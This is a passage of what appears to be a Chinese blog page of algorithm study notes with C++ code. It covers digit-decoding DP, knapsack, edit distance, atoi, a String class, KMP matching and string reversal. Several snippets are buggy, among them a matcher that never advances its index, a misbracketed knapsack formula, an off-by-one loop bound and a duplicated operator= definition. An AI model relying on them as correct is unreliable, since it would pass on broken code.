class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种题目的思路一般是将dp[i]定义为前i个字符可以表示的解码方法，根据条件判断dp[i]怎么从dp[i-1]和dp[i-2]转移过来，要判断dp[0]和dp[1]的数字，只需要看dp[2]就行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int translateNum(int num) &#123;</span><br><span class="line">        //动态规划</span><br><span class="line">        //dp[i]是前i个字符的翻译方法</span><br><span class="line">        string s=to_string(num);</span><br><span class="line">        int n=s.size();</span><br><span class="line">        vector&lt;int&gt; dp(n+1,0);</span><br><span class="line">        dp[0]=1;</span><br><span class="line">        for(int i=1;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(i==1)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]=1;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i]+=dp[i-1];</span><br><span class="line">            if(s[i-2]!=&#x27;0&#x27;&amp;&amp;s[i-1]-&#x27;0&#x27;+10*(s[i-2]-&#x27;0&#x27;)&lt;=25)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]+=dp[i-2];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int numDecodings(string s) &#123;</span><br><span class="line">        int n=s.size();</span><br><span class="line">        //dp为[1,i]前i个字符并且以i结尾的字符串映射数量</span><br><span class="line">        //dp[i]=dp[i-1]+dp[i-2] or 0 or dp[i-1]</span><br><span class="line">        //dp[0]:前0个字符,1</span><br><span class="line">        //dp[1]:1</span><br><span class="line">        vector&lt;int&gt; dp(n+1,0);</span><br><span class="line">        dp[0]=1;</span><br><span class="line">        dp[1]=s[0]==&#x27;0&#x27;?0:1;</span><br><span class="line">        for(int i=2;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(s[i-1]!=&#x27;0&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]+=dp[i-1];</span><br><span class="line">            &#125;</span><br><span class="line">            if(s[i-2]!=&#x27;0&#x27;&amp;&amp;10*(s[i-2]-&#x27;0&#x27;)+s[i-1]-&#x27;0&#x27;&lt;=26)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]+=dp[i-2];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><img src="https://pic1.zhimg.com/80/v2-280fe01f0b2d03bb1d2de06682b0c388_1440w.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">常见背包定义：</span><br><span class="line">dp[i][j]：选择前i个物品塞容量为j的背包产生的最大价值</span><br><span class="line">所以一般物品dp维数定义为：nums.size()+1，target+1(均多一维度)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0-1背包：所有物品只能选择一次,二维01背包两个for循环可以互换位置</span><br><span class="line">dp[i][j]=max(dp[i-1][j],dp[i-1][j-weight[i-1]]+value[i-1])</span><br><span class="line"></span><br><span class="line">weight数组遍历是从右向左，一维01背包两个for循环不能颠倒位置，一般先遍历物品，再遍历背包</span><br><span class="line">dp[j]=max(dp[j],dp[j-weight[i-1]+value[i-1]])</span><br><span class="line">所以在优化空间时对于weight数组的遍历必须从后往左更新</span><br><span class="line">初始化：根据定义</span><br><span class="line">dp[i][0]=0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(int i = 0; i &lt; weight.size(); i++) &#123; // 遍历物品</span><br><span class="line">    for(int j = bagWeight; j &gt;= weight[i]; j--) &#123; // 遍历背包容量</span><br><span class="line">        dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">完全背包：所有物品可以选择多次</span><br><span class="line">dp[i][j]=max(dp[i-1][j],dp[i-1][j-k*weight[i-1]]+k*value[i-1])</span><br><span class="line">对weight数组遍历从左往右</span><br><span class="line">dp[i][j]=max(dp[i-1][j],dp[i][j-weight[i-1]])</span><br><span class="line">初始化：根据定义</span><br><span class="line">dp[i][0]=0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 先遍历物品，再遍历背包</span><br><span class="line">for(int i = 0; i &lt; weight.size(); i++) &#123; // 遍历物品</span><br><span class="line">    for(int j = weight[i]; j &lt; bagWeight ; j++) &#123; // 遍历背包容量</span><br><span class="line">        dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意区别：0-1背包是从上一行的左边和上边转移过来</span><br><span class="line">完全背包是从上一行上边和当前行左边转移过来</span><br><span class="line">初始化：</span><br><span class="line">要根据所求条件初始化第一行第一列(如果压缩为1行，则注意当前行的初始化)</span><br><span class="line">比如恰好装满j最少硬币数,dp[0][0]初始化为0，其他的dp[0][j]初始化为不存在的状态(不能简单的初始化为0)</span><br></pre></td></tr></table></figure><h2 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h2><p>编辑距离（Minimum Edit Distance，MED），由俄罗斯科学家 Vladimir Levenshtein 在1965年提出，也因此而得名 Levenshtein Distance。</p><p>编辑距离指的是在两个单词<img src="https://math.jianshu.com/math?formula=%3Cw_1,w_2%3E" alt="&lt;w_1,w_2&gt;">之间，由其中一个单词<img src="https://math.jianshu.com/math?formula=w_1" alt="w_1">转换为另一个单词<img src="https://math.jianshu.com/math?formula=w_2" alt="w_2">所需要的最少<strong>单字符编辑操作</strong>次数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在这里定义的单字符编辑操作有且仅有三种：</span><br><span class="line"></span><br><span class="line">- 插入（Insertion）</span><br><span class="line">- 删除（Deletion）</span><br><span class="line">- 替换（Substitution）</span><br><span class="line"></span><br><span class="line">譬如，&quot;kitten&quot; 和 &quot;sitting&quot; 这两个单词，由 &quot;kitten&quot; 转换为  &quot;sitting&quot;  需要的最少单字符编辑操作有：</span><br><span class="line"></span><br><span class="line">1.kitten → sitten (substitution of &quot;s&quot; for &quot;k&quot;)</span><br><span class="line">2.sitten → sittin (substitution of &quot;i&quot; for &quot;e&quot;)</span><br><span class="line">3.sittin  → sitting (insertion of &quot;g&quot; at the end)</span><br><span class="line"></span><br><span class="line">因此，&quot;kitten&quot; 和 &quot;sitting&quot; 这两个单词之间的编辑距离为 3 </span><br></pre></td></tr></table></figure><h1 id="6-字符串"><a href="#6-字符串" class="headerlink" title="6.字符串"></a>6.字符串</h1><h2 id="实现atoi"><a href="#实现atoi" class="headerlink" title="实现atoi"></a>实现atoi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int atoi (const char * str)</span><br><span class="line">atoi忽略前导空格</span><br><span class="line">判断+-号</span><br><span class="line">再转化(直到非数字字符)</span><br><span class="line">第一个字符为非数字字符返回0</span><br><span class="line"></span><br><span class="line">to_string:可以转化正负数</span><br><span class="line">  忽略前导0(默认留一个是八进制)</span><br><span class="line">  </span><br><span class="line">stoi(int val,nullptr,int base=10)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int myAtoi(string s) &#123;</span><br><span class="line">        int size=s.size();</span><br><span class="line">        if(size==0)</span><br><span class="line">        &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int idx=0;</span><br><span class="line">        bool plus=true;</span><br><span class="line">        long long ans=0;   </span><br><span class="line">        while(s[idx]==&#x27; &#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        //正号负号处理</span><br><span class="line">        if(s[idx]==&#x27;+&#x27;||s[idx]==&#x27;-&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            plus=s[idx]==&#x27;+&#x27;?true:false;</span><br><span class="line">            idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        if(idx&gt;=size||!isdigit(s[idx]))</span><br><span class="line">        &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        while(isdigit(s[idx])&amp;&amp;idx&lt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            ans=10*ans+(s[idx++]-&#x27;0&#x27;);</span><br><span class="line">            if(ans&gt;INT_MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                if(!plus)</span><br><span class="line">                &#123;</span><br><span class="line">                    if(-ans&lt;INT_MIN)</span><br><span class="line">                    &#123;</span><br><span class="line">                        return INT_MIN;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else</span><br><span class="line">                    &#123;</span><br><span class="line">                        return -ans;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                return INT_MAX;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return plus==false?-ans:ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="实现string类"><a href="#实现string类" class="headerlink" title="实现string类"></a>实现string类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class String&#123;</span><br><span class="line">public:</span><br><span class="line">    // 默认构造函数</span><br><span class="line">    String(const char *str = nullptr);</span><br><span class="line">    // 拷贝构造函数</span><br><span class="line">    String(const String &amp;str);</span><br><span class="line">    // 析构函数</span><br><span class="line">    ~String();</span><br><span class="line">    // 字符串赋值函数</span><br><span class="line">    String&amp; operator=(const String &amp;str);</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">    char *m_data;</span><br><span class="line">    int m_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 构造函数</span><br><span class="line">String::String(const char *str)</span><br><span class="line">&#123;</span><br><span class="line">    if(str == nullptr)  // 加分点：对m_data加NULL 判断</span><br><span class="line">    &#123;</span><br><span class="line">        m_data = new char[1];   // 得分点：对空字符串自动申请存放结束标志&#x27;\0&#x27;的</span><br><span class="line">        m_data[0] = &#x27;\0&#x27;;</span><br><span class="line">        m_size = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        m_size = strlen(str);</span><br><span class="line">        m_data = new char[m_size + 1];</span><br><span class="line">        strcpy(m_data, str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 拷贝构造函数</span><br><span class="line">String::String(const String &amp;str)   // 得分点：输入参数为const型</span><br><span class="line">&#123;</span><br><span class="line">    m_size = str.m_size;</span><br><span class="line">    m_data = new char[m_size + 1];  //加分点：对m_data加NULL 判断</span><br><span class="line">    strcpy(m_data, str.m_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 析构函数</span><br><span class="line">String::~String()</span><br><span class="line">&#123;</span><br><span class="line">    delete[] m_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 字符串赋值函数</span><br><span class="line">/*</span><br><span class="line">我们先用delete释放了实例m_data的内存，如果此时内存不足导致new char抛出异常，则m_data将是一个空指针，</span><br><span class="line">这样非常容易导致程序崩溃。违背了异常安全性原则。</span><br><span class="line">*/</span><br><span class="line">String&amp; String::operator=(const String &amp;str)  // 得分点：输入参数为const</span><br><span class="line">&#123;</span><br><span class="line">    if(this == &amp;str)    //得分点：检查自赋值</span><br><span class="line">        return *this;</span><br><span class="line"></span><br><span class="line">    delete[] m_data;    //得分点：释放原有的内存资源</span><br><span class="line">    m_size = strlen(str.m_data);</span><br><span class="line">    m_data = new char[m_size + 1];  //加分点：对m_data加NULL 判断</span><br><span class="line">    strcpy(m_data, str.m_data);</span><br><span class="line">    return *this;       //得分点：返回本对象的引用</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 字符串赋值函数（推荐使用）</span><br><span class="line">// 保证了异常安全性</span><br><span class="line">String&amp; String::operator=(const String &amp;str)</span><br><span class="line">&#123;</span><br><span class="line">    if(this != &amp;str)</span><br><span class="line">    &#123;</span><br><span class="line">        String strTemp(str);</span><br><span class="line"></span><br><span class="line">        char* pTemp = strTemp.m_data;</span><br><span class="line">        strTemp.m_data = m_data;</span><br><span class="line">        m_data = pTemp;</span><br><span class="line">    &#125;</span><br><span class="line">    return *this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串匹配"><a href="#字符串匹配" class="headerlink" title="字符串匹配"></a>字符串匹配</h2><p>对于字符串s和p，若p是s的子串，返回p在s中的位置（p的首字符在s中对应的下标），否则返回-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">1.朴素暴力</span><br><span class="line"></span><br><span class="line">int charmatch(string s,string p)</span><br><span class="line">&#123;</span><br><span class="line">int m=s.size();</span><br><span class="line">int n=p.size();</span><br><span class="line">if(n==0)</span><br><span class="line">return 0;</span><br><span class="line">int i=0;</span><br><span class="line">int j=0;</span><br><span class="line">while(i&lt;m&amp;&amp;j&lt;n)</span><br><span class="line">&#123;</span><br><span class="line">if(s[i]==p[j])</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">i=i-j+1;</span><br><span class="line">j=0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(j==n)</span><br><span class="line">&#123;</span><br><span class="line">return i-j;</span><br><span class="line">&#125;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.改进朴素暴力</span><br><span class="line">int charmatch(string s,string p)</span><br><span class="line">&#123;</span><br><span class="line">int m=s.size();</span><br><span class="line">int n=p.size();</span><br><span class="line">if(n==0)</span><br><span class="line">return 0;</span><br><span class="line">int i=0;</span><br><span class="line">while(i&lt;=m-n)</span><br><span class="line">&#123;</span><br><span class="line">int j=i;</span><br><span class="line">int k=0;</span><br><span class="line">while(k&lt;n&amp;&amp;s[j]==p[k])</span><br><span class="line">&#123;</span><br><span class="line">k++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">if(k==m)</span><br><span class="line">return i;</span><br><span class="line">&#125;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">3.KMP算法</span><br><span class="line">next[i] 数组表示的是模式串[0,i]子串最长公共前后缀长度</span><br><span class="line">    也可以认当i不匹配时，next[i-1]就是i应该回溯的位置</span><br><span class="line">next数组求法：</span><br><span class="line">void getNext(int* next,string p)</span><br><span class="line">&#123;</span><br><span class="line">int n=p.size();</span><br><span class="line">if(n==0)</span><br><span class="line">next=nullptr;</span><br><span class="line">int j=0;</span><br><span class="line">next[0]=0;</span><br><span class="line">for(int i=1;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">while(j&gt;0&amp;&amp;(p[i]!=p[j]))</span><br><span class="line">&#123;</span><br><span class="line">j=next[j-1];</span><br><span class="line">&#125;</span><br><span class="line">if(p[i]==p[j])</span><br><span class="line">&#123;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">next[i]=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    int strStr(string haystack, string needle)</span><br><span class="line">    &#123;</span><br><span class="line">        if(needle.size()==0)</span><br><span class="line">        &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int next[needle.size()];</span><br><span class="line">        getNext(next,needle);</span><br><span class="line">        int j=0;</span><br><span class="line">        for(int i=0;i&lt;haystack.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            while(j&gt;0&amp;&amp;haystack[i]!=needle[j])</span><br><span class="line">            &#123;</span><br><span class="line">                j=next[j-1];</span><br><span class="line">            &#125;</span><br><span class="line">            if(haystack[i]==needle[j])</span><br><span class="line">            &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            if(j==needle.size())</span><br><span class="line">            &#123;</span><br><span class="line">                return i-needle.size()+1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每2k个反转前k个</span><br><span class="line">输入：s = &quot;abcdefg&quot;, k = 2</span><br><span class="line">输出：&quot;bacdfeg&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string reversestr(string s,int k)</span><br><span class="line">&#123;</span><br><span class="line">    //</span><br><span class="line">    int n=s.size();</span><br><span class="line">    for(int i=0;i&lt;n;i+=2*k)</span><br><span class="line">    &#123;</span><br><span class="line">        reverse(s.begin()+i,min(s.begin()+i+k,s.end()));</span><br><span class="line">    &#125;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反转每个单词(可能有多个空格)</span><br><span class="line">I am a student</span><br><span class="line">student a am I</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路：给定一个指针index从0开始</span><br><span class="line">     start记录end!=&#x27; &#x27;的开始</span><br><span class="line">     index记录不为&#x27; &#x27;的结束</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">string reverseWords(string s) &#123;</span><br><span class="line">    int n=s.size();</span><br><span class="line">    int l=0;</span><br><span class="line">    int r=0;</span><br><span class="line">    int index=0;</span><br><span class="line">    //&quot;    I am     a    student    &quot;</span><br><span class="line">    while(r&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">    //1.判断大右边界是否为空</span><br><span class="line">        if(s[r]==&#x27; &#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            r++;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //4.添加空格</span><br><span class="line">        if(index!=0)</span><br><span class="line">        &#123;</span><br><span class="line">            s[index++]=&#x27; &#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        //2.记录左边界</span><br><span class="line">        l=index;</span><br><span class="line">        //3.移动两个右边界</span><br><span class="line">        while(r&lt;n&amp;&amp;s[r]!=&#x27; &#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            s[index++]=s[r++];</span><br><span class="line">        &#125;</span><br><span class="line">        //4.反转左右边界</span><br><span class="line">        reverse(s.begin()+l,s.begin()+index);</span><br><span class="line">    &#125;</span><br><span class="line">    s.erase(s.begin()+index,s.end());</span><br><span class="line">    reverse(s.begin(),s.end());</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串模拟大数相乘"><a href="#字符串模拟大数相乘" class="headerlink" title="字符串模拟大数相乘"></a>字符串模拟大数相乘</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.从后向前遍历</span><br><span class="line">2.定义的一维数组最长位m+n</span><br><span class="line">3.res[i+j+1]为相乘的后一位，res[i+j]为进位的那位，sum=res[i+j+1]+num[i]*num[j],res[i+j+1]=sum%10,res[i+j]+=sum/10,往前移动时，后面多的进位会再次累加到上上一位</span><br><span class="line">4.不要忘了最多是m+n位，不要忘记*0的情况</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 